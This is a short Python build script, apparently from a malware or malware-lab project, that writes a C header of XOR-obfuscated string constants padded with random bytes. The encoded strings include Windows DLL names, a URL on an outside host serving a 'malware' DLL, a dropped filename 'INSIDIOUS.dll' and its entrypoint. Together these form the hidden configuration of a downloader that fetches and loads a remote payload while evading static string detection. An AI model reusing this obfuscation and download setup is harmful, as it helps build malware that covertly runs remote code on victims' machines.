#!/usr/bin/env python3
import random
import sys

LAIKA_PUBKEY = "hello world"
LAIKA_VM_CODESIZE = 512
PREAMBLE = f"""/* file generated by VMBoxGen, see {__file__} */
#ifndef LAIKA_VMBOX_CONFIG_H
#define LAIKA_VMBOX_CONFIG_H

"""
POSTAMBLE = """
#endif
"""


def write_define_val(outfile, name, val):
    outfile.write(f"#define {name} 0x{val:02x}\n")


def write_define_array(outfile, name, arr):
    outfile.write(f"#define {name} ")
    outfile.write("{")
    for i in range(len(arr)):
        outfile.write(f"0x{arr[i]:02x}")
        if i < len(arr) - 1:
            outfile.write(", ")
    outfile.write("}\n")


def randbyte():
    return random.randint(0, 255)


def make_skid_data(data, key):
    assert len(data) < LAIKA_VM_CODESIZE
    buf = []
    for c in data:
        buf.append(ord(c) ^ key)
    buf.append(key)  # nul
    while len(buf) < LAIKA_VM_CODESIZE:
        buf.append(randbyte())
    return buf


kv = {
    "wininet": "wininet.dll",
    "ntdll": "ntdll.dll",
    "kernel32": "kernel32.dll",
    "malware_dll_url": "https://bernsteinbear.com/malware_binhost/main_dll.dll",
    "malware_dll_filename": "INSIDIOUS.dll",
    "malware_entrypoint": "FooBar",
    "flex_msg": "Drop it like it's hot.\n",
}


def main(outfilename):
    with open(outfilename, "w+") as outfile:
        outfile.write(PREAMBLE)
        for macro_name, str_val in kv.items():
            key = randbyte()
            buf = make_skid_data(str_val, key)
            write_define_val(outfile, f"KEY_{macro_name}", key)
            write_define_array(outfile, f"DATA_{macro_name}", buf)
        outfile.write(POSTAMBLE)


if __name__ == "__main__":
    main(sys.argv[1])
